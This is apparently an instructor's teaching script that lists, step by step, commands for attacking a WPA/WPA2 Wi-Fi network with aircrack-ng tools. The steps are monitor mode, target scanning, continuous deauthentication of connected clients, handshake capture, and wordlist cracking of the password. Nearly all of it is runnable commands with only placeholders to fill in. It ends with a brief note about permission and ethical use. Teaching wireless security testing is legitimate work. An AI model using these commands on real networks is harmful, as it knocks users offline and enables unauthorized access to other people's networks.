# Instructor: Dr. Asif Siddiqui
# ================================

# 1. Identify Wireless Interfaces
# List all wireless network interfaces and their current modes
iwconfig

# 2. Kill Interfering Processes
# Terminate processes that might interfere with monitor mode (e.g., NetworkManager)
sudo airmon-ng check kill

# 3. Start Monitor Mode
# Enable monitor mode on the wireless interface (replace 'wlan0' with your interface name)
sudo airmon-ng start wlan0

# 4. Verify Monitor Mode
# Confirm that the wireless interface is now in monitor mode (e.g., wlan0mon)
iwconfig

# 5. Scan for Available Wireless Networks
# Use airodump-ng to scan for nearby wireless networks and identify target SSID, BSSID, and channel
sudo airodump-ng wlan0mon

# 6. Focus on Target Network
# Narrow down the scan to the specific target network by specifying its BSSID and channel
# Replace [BSSID] with the target network's MAC address and [Channel] with its channel number
sudo airodump-ng -d [BSSID] -c [Channel] wlan0mon

# 7. Execute Deauthentication Attack
# Send deauthentication frames to the target network to disconnect connected clients
# Replace [BSSID] with the target access point's MAC address
sudo aireplay-ng --deauth 0 -a [BSSID] wlan0mon

# 8. Capture the Handshake
# Start capturing packets on the target network to capture the WPA/WPA2 four-way handshake
# Replace [Channel] with the target network's channel and [BSSID] with its MAC address
sudo airodump-ng -w capture -c [Channel] --bssid [BSSID] wlan0mon

# 9. Deauthenticate Specific Client (Optional)
# Target a specific client device to force a handshake capture
# Replace [BSSID] with the access point's MAC address and [Client MAC] with the client's MAC address
sudo aireplay-ng --deauth 4 -a [BSSID] -c [Client MAC] wlan0mon

# 10. Verify Handshake Capture with Wireshark
# Open the captured handshake file in Wireshark for analysis
# Replace 'capture-01.cap' with your actual capture file name if different
wireshark capture-01.cap

# 11. Crack the Captured Password
# Use aircrack-ng to attempt to crack the WPA/WPA2 password using a wordlist
# Replace 'capture-01.cap' with your capture file and ensure the wordlist path is correct
aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt

# ================================
# Notes:
# - Ensure you have the necessary permissions to perform these actions.
# - Replace placeholders (e.g., [BSSID], [Channel], [Client MAC]) with actual values.
# - Use this script responsibly and ethically within a controlled environment.
